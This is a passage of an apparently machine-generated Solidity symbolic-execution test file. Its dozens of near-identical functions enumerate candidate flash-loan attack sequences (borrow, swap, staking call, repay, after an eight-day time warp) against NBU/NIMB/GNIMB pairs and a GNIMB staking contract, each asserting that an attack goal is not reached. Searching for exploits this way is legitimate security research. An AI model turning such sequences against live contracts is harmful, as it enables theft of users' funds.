        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4519(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4520(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4521(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4522(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4523(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4524(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4525(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4526(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4527(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4528(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4529(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4530(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4531(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4532(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4533(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4534(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4535(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4536(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4537(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4538(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4539(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4540(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4541(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4542(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4543(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4544(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4545(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4546(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4547(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4548(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4549(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4550(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4551(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4552(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4553(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4554(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4555(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4556(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4557(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4558(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4559(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4560(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4561(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4562(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4563(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4564(
        uint256 amt0,
